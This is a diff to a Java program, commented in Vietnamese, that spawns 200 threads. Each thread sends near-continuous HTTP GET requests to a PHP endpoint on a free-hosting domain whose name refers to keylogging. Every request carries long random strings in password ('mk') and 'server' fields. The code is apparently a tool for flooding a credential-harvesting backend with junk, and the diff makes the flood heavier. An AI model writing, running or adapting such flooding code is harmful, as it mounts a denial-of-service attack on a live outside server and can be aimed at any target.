@@ -1,26 +1,22 @@
-import java.io.InputStream;
-import java.io.InputStreamReader;
+import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.security.SecureRandom;
 
-public class FileHTTP implements Runnable {
+public class Http implements Runnable {
     private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
     private static final String[] URLS = {
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
-            "https://taothichkeylog.000webhostapp.com/datvippro.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
+            "https://taothichkeylog.000webhostapp.com/dat009vip.php",
             "https://taothichkeylog.000webhostapp.com/datvippro.php",
             "https://taothichkeylog.000webhostapp.com/datvippro.php",
             "https://taothichkeylog.000webhostapp.com/datvippro.php",
@@ -34,22 +30,21 @@ public class FileHTTP implements Runnable {
             // Thêm các đường link khác vào đây
     };
 
-    public static void sendHttpRequest(String urlStr) {
-        try {
-            URL url = new URL(urlStr);
-            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-            connection.setRequestMethod("GET");
-            connection.setDoOutput(true);
-            connection.connect();
+    public static void sendHttpRequest(String urlStr) throws IOException {
+        URL url = new URL(urlStr);
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("GET");
+        connection.setDoOutput(true);
+        connection.connect();
 
-            InputStream inputStream = connection.getInputStream();
-            new InputStreamReader(inputStream, "UTF-8").close();
-            inputStream.close();
-
-            connection.disconnect();
-        } catch (Exception e) {
-            e.printStackTrace();
+        int responseCode = connection.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_OK) {
+            System.out.println("Status: " + responseCode);
+        } else {
+            System.out.println("Status: " + responseCode);
         }
+
+        connection.disconnect();
     }
 
     public static String generateRandomString(int length) {
@@ -75,12 +70,16 @@ public class FileHTTP implements Runnable {
                 stringBuilder.append("&mk=");
                 stringBuilder.append(generateRandomString(1000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "mk"
                 stringBuilder.append("&server=");
-                stringBuilder.append(generateRandomString(1900)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "sv"
-                sendHttpRequest(stringBuilder.toString());
+                stringBuilder.append(generateRandomString(2000)); // Sinh chuỗi ngẫu nhiên có 20 ký tự cho phần "sv"
+                try {
+                    sendHttpRequest(stringBuilder.toString());
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
 
             try {
-                Thread.sleep(0); // Đợi 1 giây trước khi gửi yêu cầu tới các đường link khác
+                Thread.sleep(1); // Đợi 1 giây trước khi gửi yêu cầu tới các đường link khác
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -88,8 +87,12 @@ public class FileHTTP implements Runnable {
     }
 
     public static void main(String[] args) {
-        FileHTTP fileHTTP = new FileHTTP();
-        Thread thread = new Thread(fileHTTP);
-        thread.start();
+        Http fileHTTP = new Http();
+        int threadCount = 200;
+
+        for (int i = 0; i < threadCount; i++) {
+            Thread thread = new Thread(fileHTTP);
+            thread.start();
+        }
     }
 }
